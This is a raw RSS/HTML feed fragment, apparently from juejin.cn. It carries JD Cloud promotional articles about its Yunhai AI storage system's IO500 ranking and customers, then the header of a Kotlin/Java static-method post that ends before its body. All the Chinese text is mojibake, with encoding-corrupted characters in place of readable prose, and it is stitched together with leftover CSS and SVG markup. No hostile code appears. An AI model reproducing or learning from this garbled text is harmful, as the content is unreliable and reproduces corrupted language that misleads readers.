<p>IO500æ˜¯å…¨çƒé«˜æ€§èƒ½è®¡ç®—HPCé¢†åŸŸæœ€æƒå¨ã€æœ€å…·å½±å“åŠ›çš„å­˜å‚¨ç³»ç»Ÿæ€§èƒ½è¯„æµ‹æ ‡å‡†ä¹‹ä¸€ï¼Œè¯„æµ‹ç»´åº¦æ¶µç›–äº†é«˜æ€§èƒ½å­˜å‚¨ç³»ç»Ÿçš„å¤šä¸ªå…³é”®èƒ½åŠ›ï¼ŒåŒ…æ‹¬å¸¦å®½æ€§èƒ½ã€å…ƒæ•°æ®æ€§èƒ½ã€æ··åˆè´Ÿè½½ã€å¹¶è¡Œæ€§å’Œå¯æ‰©å±•æ€§ï¼Œè¢«èª‰ä¸ºå…¨çƒé«˜æ€§èƒ½å­˜å‚¨é¢†åŸŸçš„é‡‘æ ‡å‡†ã€‚äº¬ä¸œäº‘å‡­å€Ÿå…¨è‡ªç ”äº‘æµ·AIå­˜å‚¨ç³»ç»ŸJPFSã€æ—  PMEM çš„é€šç”¨å­˜å‚¨ç¡¬ä»¶æ¶æ„å’Œ20èŠ‚ç‚¹å°è§„æ¨¡å­˜å‚¨é›†ç¾¤ä¸‹è¾¾æˆè¯¥æˆç»©ï¼Œå°è¯äº‘æµ· AI å­˜å‚¨åœ¨è½¯ä»¶æ ˆè°ƒä¼˜ã€æ•°æ®è·¯å¾„ä¼˜åŒ–ã€ç½‘ç»œ RDMA å¤„ç†ã€å¹¶è¡Œ I/O è°ƒåº¦ç­‰æ ¸å¿ƒæŠ€æœ¯ä¸Šï¼Œå·²è¾¾å›½é™…é¢†å…ˆæ°´å¹³ã€‚</p>
<p>æ­¤æ¬¡äº‘æµ· AI å­˜å‚¨JPFSæ–©è·äº†ä¸‰é¡¹ â€œå…¨çƒç¬¬ä¸€â€ã€‚é¦–å…ˆæ˜¯é€šç”¨ç¡¬ä»¶æ€§èƒ½ç¬¬ä¸€ï¼Œä¸ä½¿ç”¨ PMEM ç¡¬ä»¶åŠ é€Ÿï¼Œå®Œå…¨åŸºäºé€šç”¨ NVMe SSD è®¾å¤‡ï¼Œè·‘å‡ºå…¨çƒé¢†å…ˆæˆç»©ï¼›å…¶æ¬¡æ˜¯æ€§èƒ½æˆæœ¬æ¯”ç¬¬ä¸€ï¼Œä»¥æ›´ä½ç¡¬ä»¶æˆæœ¬å®ç°æ¥è¿‘æŒä¹…å†…å­˜æ¶æ„çš„æ€§èƒ½è¡¨ç°ã€‚ç¬¬ä¸‰æ˜¯å¯è§„æ¨¡åŒ–è½åœ°ç¬¬ä¸€ï¼Œæ¶æ„å…·å¤‡é«˜åº¦å¯å¤åˆ¶æ€§ï¼Œå¯åœ¨æ™ºç®—/è¶…ç®—ç­‰å¤§è§„æ¨¡å­˜å‚¨åœºæ™¯ä¸­å¿«é€Ÿéƒ¨ç½²ã€‚</p>
<p>äº‘æµ·AIå­˜å‚¨ï¼Œä½œä¸ºäº¬ä¸œäº‘è‡ªä¸»ç ”å‘çš„é¢å‘AIå¤§æ¨¡å‹éœ€æ±‚çš„æ–°ä¸€ä»£åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿï¼Œå†ç»äº¬ä¸œ618ã€äº¬ä¸œ11.11å¤§è§„æ¨¡å®è·µéªŒè¯ï¼ŒåŸºäºå­˜ç®—åˆ†ç¦»æ¶æ„ï¼Œå¯ä»¥å¾ˆå¥½æ»¡è¶³æ™ºç®—åœºæ™¯æè‡´çš„å­˜å‚¨æ€§èƒ½éœ€æ±‚ï¼Œå®ƒå…·å¤‡4å¤§ç‰¹æ€§ï¼š</p>
<p><strong>åœ¨æè‡´æ€§èƒ½</strong>æ–¹é¢ï¼Œäº‘æµ·AIå­˜å‚¨å¯æ”¯æŒåƒäº¿çº§å‚æ•°AIå¤§æ¨¡å‹ï¼Œèåˆè¶…ä½å»¶æ—¶RDMAç½‘ç»œåŠè½¯ä»¶æ¶æ„ä¼˜åŒ–ï¼Œ4Kéšæœºå†™IOPSè¾¾åˆ°1000ä¸‡çº§ï¼Œå¹³å‡å»¶è¿Ÿåœ¨100å¾®ç§’çº§ï¼Œå•èŠ‚ç‚¹å¯æä¾› 44GB/sçš„å¸¦å®½æ€§èƒ½ï¼Œæ»¡è¶³æè‡´çš„å­˜å‚¨æ€§èƒ½éœ€æ±‚ã€‚</p>
<p><strong>åœ¨æè‡´æ€§ä»·æ¯”æ–¹é¢</strong>ï¼Œåˆ›æ–°çš„å­˜ç®—åˆ†ç¦»æŠ€æœ¯æ¶æ„ï¼Œå°†è®¡ç®—å’Œå­˜å‚¨è§£è€¦ç‹¬ç«‹ï¼Œå­˜ç®—èµ„æºç‹¬ç«‹è°ƒåº¦ï¼Œå¤§å¹…æé«˜èµ„æºåˆ©ç”¨ç‡å’Œç³»ç»Ÿå¯é æ€§ã€‚äº‘æµ·æ”¯æŒä½è‡³1.1xå‰¯æœ¬çš„ä¸šå†…è¶…ä½å†—ä½™çš„ECå­˜å‚¨ï¼Œå¹¶åœ¨ç”Ÿäº§ç¯å¢ƒæˆç†Ÿä½¿ç”¨ï¼Œç£ç›˜ç©ºé—´åˆ©ç”¨ç‡é«˜è¾¾90%ä»¥ä¸Šã€‚</p>
<p><strong>åœ¨é«˜å¯ç”¨æ€§æ–¹é¢</strong>ï¼Œäº‘æµ·æ•°æ®å¯é æ€§è¾¾åˆ°11ä¸ª9ï¼Œæ•…éšœç§’çº§æ¢å¤ç”¨æˆ·æ— æ„Ÿï¼Œä¸¤å‰¯æœ¬æ•…éšœä»å¯ä¿æŒæ•°æ®å†™å…¥100%å¯ç”¨ã€‚å†ç»äº¬ä¸œ618ã€äº¬ä¸œ11.11å¤§è§„æ¨¡å®è·µåœºæ™¯æ‰“ç£¨ï¼ŒEBçº§å­˜å‚¨è§„æ¨¡å®è·µéªŒè¯ã€‚</p>
<p><strong>åœ¨è‡ªä¸»å¯æ§æ–¹é¢</strong>ï¼Œäº‘æµ·ä¸ºäº¬ä¸œäº‘100%è‡ªç ”äº§å“ï¼Œä»£ç è‡ªç ”ç‡è¶…98%ï¼Œæ ¸å¿ƒæŠ€æœ¯å®Œå…¨è‡ªä¸»å¯æ§ï¼Œå·²ä¸ä¸»æµå›½äº§åŒ–ç¡¬ä»¶å’Œè½¯ä»¶å…¼å®¹äº’è®¤ï¼Œå¹¶èƒ½å®ç°å…¼å®¹åæ€§èƒ½æ— æ˜æ˜¾è¡°å‡ï¼Œå·²åœ¨äº¬ä¸œæ ¸å¿ƒåœºæ™¯å®ç°å›½äº§åŒ–å®è·µéªŒè¯ã€‚</p>
<p>ç›®å‰ï¼Œæ¥è‡ªé“¶è¡Œã€è¯åˆ¸ã€æ±½è½¦ã€é›¶å”®ç­‰é¢†åŸŸè¶…100å®¶å¤§å‹ä¼ä¸šï¼Œæ­£åœ¨ä½¿ç”¨äº‘æµ·AIå­˜å‚¨ã€‚é¢å‘æœªæ¥ï¼Œäº¬ä¸œäº‘å°†æŒç»­æŠ•å…¥è‡ªç ”å­˜å‚¨ç³»ç»Ÿçš„æ·±åº¦ä¼˜åŒ–ï¼Œæ¨åŠ¨é«˜æ€§èƒ½å­˜å‚¨åœ¨ AI æ¨¡å‹è®­ç»ƒã€ç§‘å­¦è®¡ç®—ã€å¤§è§„æ¨¡æ•°æ®åˆ†æç­‰åœºæ™¯ä¸­çš„æ›´å¹¿æ³›åº”ç”¨ï¼ŒåŠ©åŠ›æ›´å¤šä¼ä¸šé‡å¡‘AIç”Ÿäº§åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[äº¬ä¸œäº‘æµ·å­˜å‚¨æˆä¸ºå…¨çƒæœ€å¤§è§„æ¨¡åŸºäºå›½äº§CPUçš„AIå­˜å‚¨æŠ€æœ¯åº”ç”¨]]></title>    <link>https://juejin.cn/post/7576994308273733651</link>    <guid>https://juejin.cn/post/7576994308273733651</guid>    <pubDate>2025-11-27T06:40:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576994308273733651" data-draft-id="7576994308273700883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="äº¬ä¸œäº‘æµ·å­˜å‚¨æˆä¸ºå…¨çƒæœ€å¤§è§„æ¨¡åŸºäºå›½äº§CPUçš„AIå­˜å‚¨æŠ€æœ¯åº”ç”¨"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-27T06:40:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            äº¬ä¸œäº‘æµ·å­˜å‚¨æˆä¸ºå…¨çƒæœ€å¤§è§„æ¨¡åŸºäºå›½äº§CPUçš„AIå­˜å‚¨æŠ€æœ¯åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:40:34.000Z" title="Thu Nov 27 2025 06:40:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥ï¼Œåœ¨å…¨çƒæœ€æƒå¨çš„å­˜å‚¨ç³»ç»Ÿæ€§èƒ½è¯„æµ‹IO500æ¦œå•ä¸Šï¼Œäº¬ä¸œäº‘æµ·è·»èº«æ¦œå•å…¨çƒå‰å››ã€å›½äº§è‡ªç ”ç¬¬ä¸€ã€‚ç”±æ­¤ï¼Œ<strong>äº¬ä¸œäº‘æµ·å­˜å‚¨æˆä¸ºå…¨çƒæœ€å¤§è§„æ¨¡åŸºäºå›½äº§CPUçš„AIå­˜å‚¨æŠ€æœ¯åº”ç”¨</strong>ï¼Œä¹Ÿæ˜¯ç›®å‰å…¨çƒæ€§èƒ½æœ€å¼ºçš„åŸºäºé€šç”¨NVMeæ¶æ„çš„AIå­˜å‚¨ã€‚</p>
<h3 data-id="heading-0"><strong>ä¸€ã€æè‡´å­˜å‚¨æ€§èƒ½ï¼Œæ–©è·å¤šé¡¹å…¨çƒç¬¬ä¸€</strong></h3>
<p>åŸºäºé€šç”¨ NVMe ç›˜å­˜å‚¨æœåŠ¡å™¨ï¼Œç»“åˆå…¨æ ˆè‡ªç ”è½¯ä»¶ä½“ç³»ä¸æ·±åº¦è°ƒä¼˜ï¼Œæ­¤æ¬¡äº‘æµ· AI å­˜å‚¨æ–©è·äº†å¤šé¡¹ â€œå…¨çƒç¬¬ä¸€â€ï¼š</p>
<p>é¦–å…ˆï¼Œ<strong>é€šç”¨ç¡¬ä»¶æ€§èƒ½ç¬¬ä¸€</strong>ï¼Œä¸ä½¿ç”¨ PMEM ç¡¬ä»¶åŠ é€Ÿï¼Œå®Œå…¨åŸºäºé€šç”¨ NVMe SSD è®¾å¤‡ï¼Œè·‘å‡ºå…¨çƒé¢†å…ˆæˆç»©ï¼›</p>
<p>å…¶æ¬¡ï¼Œ<strong>æ€§èƒ½æˆæœ¬æ¯”ç¬¬ä¸€</strong>ï¼Œä»¥æ›´ä½ç¡¬ä»¶æˆæœ¬å®ç°æ¥è¿‘æŒä¹…å†…å­˜æ¶æ„çš„æ€§èƒ½è¡¨ç°ã€‚</p>
<p>ç¬¬ä¸‰ï¼Œ<strong>å¯è§„æ¨¡åŒ–è½åœ°ç¬¬ä¸€</strong>ï¼Œæ¶æ„å…·å¤‡é«˜åº¦å¯å¤åˆ¶æ€§ï¼Œå¯åœ¨æ™ºç®—/è¶…ç®—ç­‰å¤§è§„æ¨¡å­˜å‚¨åœºæ™¯ä¸­å¿«é€Ÿéƒ¨ç½²ã€‚</p>
<p>åœ¨æ’è¡Œæ¦œå•ä¸Šçš„ä¼˜ç§€æˆç»©ï¼Œæºäºäº¬ä¸œäº‘åå¤šå¹´åœ¨å­˜å‚¨é¢†åŸŸçš„æŠ€æœ¯ç§¯ç´¯ã€‚ä½œä¸ºäº¬ä¸œäº‘è‡ªä¸»ç ”å‘çš„é¢å‘AIå¤§æ¨¡å‹éœ€æ±‚çš„æ–°ä¸€ä»£åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿï¼Œå†ç»äº¬ä¸œ618ã€äº¬ä¸œ11.11å¤§è§„æ¨¡å®è·µéªŒè¯ï¼ŒåŸºäºå­˜ç®—åˆ†ç¦»æ¶æ„ï¼Œå¯ä»¥å¾ˆå¥½æ»¡è¶³æ™ºç®—åœºæ™¯æè‡´çš„å­˜å‚¨æ€§èƒ½éœ€æ±‚ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57c8e0fc6b44c0c8eb44a7453c060d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764830434&amp;x-signature=XjnD%2FKts7EXUdX1ao4BjtMdxGxY%3D" alt="å›¾ç‰‡.png" loading="lazy"/></p>
<p>åœ¨æè‡´æ€§èƒ½æ–¹é¢ï¼Œäº‘æµ·AIå­˜å‚¨å¯æ”¯æŒåƒäº¿çº§å‚æ•°AIå¤§æ¨¡å‹ï¼Œè‡ªç ”å¼•æ“é‡‡ç”¨å…¨è¿½åŠ å†™æ¨¡å‹ï¼Œèåˆè¶…ä½å»¶æ—¶RDMAç½‘ç»œåŠè½¯ä»¶æ¶æ„ä¼˜åŒ–ï¼Œ4Kéšæœºå†™IOPSè¾¾åˆ°1000ä¸‡çº§ï¼Œå¹³å‡å»¶è¿Ÿåœ¨100å¾®ç§’çº§ï¼ŒI/Oæ€§èƒ½æ¥è¿‘æœ¬åœ°NVMeç£ç›˜ï¼Œå•èŠ‚ç‚¹å¯æä¾› 44GiB/sçš„å¸¦å®½æ€§èƒ½ã€‚</p>
<p>äº‘æµ·ä¸ºäº¬ä¸œäº‘å…¨è‡ªç ”å­˜å‚¨ï¼Œä»£ç è‡ªç ”ç‡è¶…98%ï¼Œæ‹¥æœ‰å®Œå…¨è‡ªä¸»çŸ¥è¯†äº§æƒï¼Œä¸ä¸»æµå›½äº§åŒ–ç¡¬ä»¶å’Œè½¯ä»¶å…¼å®¹äº’è®¤ï¼Œæ‹¬æ“ä½œç³»ç»Ÿã€æ•°æ®åº“ã€ä¸­é—´ä»¶ã€æœåŠ¡å™¨ã€CPUã€ä¸»æ¿ã€ç½‘å¡ã€SSDç­‰ï¼Œå¹¶åŸºäºå…¨å±€æ— é”æ¶æ„ï¼Œå……åˆ†å‘æŒ¥å›½äº§ç¡¬ä»¶èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-1"><strong>äºŒã€è¶…100å®¶å¤§å‹ä¼ä¸šé€‰æ‹©äº‘æµ·AIå­˜å‚¨ï¼ŒåŠ é€ŸAIè½åœ°äº§ä¸š</strong></h3>
<p>ç›®å‰ï¼Œæ¥è‡ªé“¶è¡Œã€è¯åˆ¸ã€æ±½è½¦ã€é›¶å”®ç­‰é¢†åŸŸè¶…100å®¶å¤§å‹ä¼ä¸šï¼Œæ­£åœ¨ä½¿ç”¨äº‘æµ·AIå­˜å‚¨ã€‚</p>
<p>åœ¨ç§‘æŠ€é¢†åŸŸï¼Œ<strong>ç§‘å¤§è®¯é£</strong>AIè¥é”€é‡‡ç”¨â€œå¼€æºåˆ†å¸ƒå¼å­˜å‚¨è½¯ä»¶+æœåŠ¡å™¨ç¡¬ä»¶â€æ­å»ºï¼Œå¯¹åäº¿çº§å°æ–‡ä»¶æ•°æ®é‡æ—¶ï¼Œè¯»å†™æ€§èƒ½é™¡ç„¶ä¸‹é™ã€‚å‡çº§äº¬ä¸œäº‘AIå­˜å‚¨äº‘æµ·åï¼Œç§‘å¤§è®¯é£AIè¥é”€å®ç°äº†ä¸€ä¸ªé›†ç¾¤ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå³å¯è½»æ¾åº”å¯¹å¤šæ¨¡æ€å¤§æ¨¡å‹æ—¶åƒäº¿~åä¸‡äº¿å‚æ•°è§„æ¨¡ï¼›åŒæ—¶ï¼ŒåŸºäºé«˜æ€§èƒ½å­˜å‚¨å±‚ï¼Œä»¥åŠå¤§å®¹é‡å­˜å‚¨å±‚çš„è‡ªåŠ¨æ•°æ®åˆ†çº§ï¼Œåœ¨å¤§å¹…é™ä½å­˜å‚¨æˆæœ¬çš„åŒæ—¶ï¼Œå®ç°äº†å¤§æ¨¡å‹è®­ç»ƒèƒ½åŠ›çš„å¤§å¹…æå‡ï¼ŒåŠ©åŠ›AIè¥é”€ä¸šåŠ¡é™æœ¬å¢æ•ˆã€‚</p>
<p>åœ¨äº’è”ç½‘é¢†åŸŸï¼Œ<strong>å¢¨è¿¹å¤©æ°”</strong>æ˜¯å…¨çƒé¢†å…ˆçš„æ°”è±¡æœåŠ¡ä¼ä¸šï¼Œæˆªè‡³2024å¹´ï¼Œæ‹¥æœ‰è¶…è¿‡7äº¿ç”¨æˆ·ï¼Œå¤©æ°”æ—¥æŸ¥è¯¢æ¬¡æ•°è¿‡6äº¿æ¬¡ã€‚éšç€ä¸šåŠ¡è§„æ¨¡çš„æ‰©å¤§ï¼Œå¢¨è¿¹å¤©æ°”è¶Šæ¥è¶Šå¤šçš„æ•°æ®éœ€è¦åœ¨é™æœ¬å¢æ•ˆçš„ç›®æ ‡ä¸‹è¿›è¡Œå®‰å…¨çš„å­˜å‚¨ã€‚å¢¨è¿¹å¤©æ°”ä¸äº¬ä¸œäº‘äº‘æµ·å…±åŒå»ºè®¾æ–°çš„åˆ†å¸ƒå¼å­˜å‚¨ï¼Œé‡‡ç”¨ä½å†—ä½™å­˜å‚¨çš„æŠ€æœ¯ï¼Œåœ¨ä¸é™ä½æ€§èƒ½å’Œå¯é æ€§çš„æƒ…å†µä¸‹ï¼Œåªéœ€è¦1.14ä¸ªå‰¯æœ¬ï¼Œå¤§å¹…æå‡èµ„æºåˆ©ç”¨ç‡ã€‚</p>
<p>åœ¨é‡‘èé¢†åŸŸï¼Œ<strong>å›½å†…æŸå¤´éƒ¨è¯åˆ¸å…¬å¸</strong>ä¼ ç»Ÿå­˜å‚¨ç³»ç»Ÿåœ¨æ€§èƒ½ã€ç¨³å®šæ€§å’Œæ•…éšœæ¢å¤ç­‰æ–¹é¢å­˜åœ¨è¯¸å¤šç—›ç‚¹ï¼Œé¢ä¸´ç€ç³»ç»Ÿæ¶æ„æ•´ä½“å›½äº§åŒ–å‡çº§çš„è¿«åˆ‡éœ€æ±‚ã€‚äº¬ä¸œäº‘äº‘æµ·é‡‡ç”¨å¤šå°é²²é¹å’Œæµ·å…‰CPUæ¶æ„å­˜å‚¨ä¸€ä½“æœºæ­å»ºåˆ†å¸ƒå¼å­˜å‚¨é›†ç¾¤ï¼Œå…¨é¢é€‚é…å›½äº§åŒ–ç³»ç»ŸåŠè™šæ‹ŸåŒ–å¹³å°ã€‚è¿™ä¸€æ–¹æ¡ˆä¸ä»…æ»¡è¶³äº†è¯¥è¯åˆ¸å…¬å¸çš„å›½äº§åŒ–éœ€æ±‚ï¼Œè¿˜é€šè¿‡æä¾›POSIXã€NFSã€CIFSã€S3ç­‰å­˜å‚¨åè®®ï¼Œæ”¯æŒå—ã€æ–‡ä»¶å’Œå¯¹è±¡å­˜å‚¨ï¼Œå®ç°äº†ä¸€ä¸ªå­˜å‚¨å¹³å°æ»¡è¶³å¤šç§åœºæ™¯éœ€æ±‚ï¼Œæå‡äº†ä¿¡æ¯å®‰å…¨è‡ªä¸»å¯æ§èƒ½åŠ›ã€‚</p>
<p>é¢å‘æœªæ¥ï¼Œäº¬ä¸œäº‘å°†æŒç»­æŠ•å…¥è‡ªç ”å­˜å‚¨ç³»ç»Ÿçš„æ·±åº¦ä¼˜åŒ–ï¼Œæ¨åŠ¨é«˜æ€§èƒ½å­˜å‚¨åœ¨ AI æ¨¡å‹è®­ç»ƒã€ç§‘å­¦è®¡ç®—ã€å¤§è§„æ¨¡æ•°æ®åˆ†æç­‰åœºæ™¯ä¸­çš„æ›´å¹¿æ³›åº”ç”¨ï¼ŒåŠ©åŠ›æ›´å¤šä¼ä¸šé‡å¡‘AIç”Ÿäº§åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotliné‡ä¸ŠJava é™æ€æ–¹æ³•]]></title>    <link>https://juejin.cn/post/7577049352837971983</link>    <guid>https://juejin.cn/post/7577049352837971983</guid>    <pubDate>2025-11-27T06:37:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352837971983" data-draft-id="7577201863750778920" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotliné‡ä¸ŠJava é™æ€æ–¹æ³•"/> <meta itemprop="keywords" content="Kotlin,Android,Java"/> <meta itemprop="datePublished" content="2025-11-27T06:37:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ–¹ç™½ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotliné‡ä¸ŠJava é™æ€æ–¹æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ–¹ç™½ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:37:26.000Z" title="Thu Nov 27 2025 06:37:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
